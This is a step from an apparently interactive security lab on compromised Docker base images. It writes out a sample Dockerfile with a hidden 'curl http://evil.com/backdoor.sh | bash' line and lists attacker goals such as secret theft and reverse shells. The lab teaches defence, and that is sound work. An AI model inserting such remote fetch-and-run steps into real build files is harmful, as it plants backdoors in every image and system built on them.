## Step 4: Test malicious base image

```bash
# Simulated compromised base image
cat > /tmp/malicious-dockerfile << 'EOF'
# Looks legitimate
FROM ubuntu:20.04

# Install dependencies
RUN apt-get update && apt-get install -y curl wget

# Hidden malicious code
RUN curl -s http://evil.com/backdoor.sh | bash

# Application code (looks normal)
COPY app.py /app/
WORKDIR /app
CMD ["python3", "app.py"]
EOF

cat /tmp/malicious-dockerfile

echo ""
echo "Compromised base images can:"
echo "- Exfiltrate environment variables"
echo "- Steal secrets from /var/run/secrets"
echo "- Mine cryptocurrency"
echo "- Create reverse shells"
echo "- Remain dormant until triggered"
```{{exec}}

A compromised base image affects every image built on top of it - the malicious code hides in plain sight.
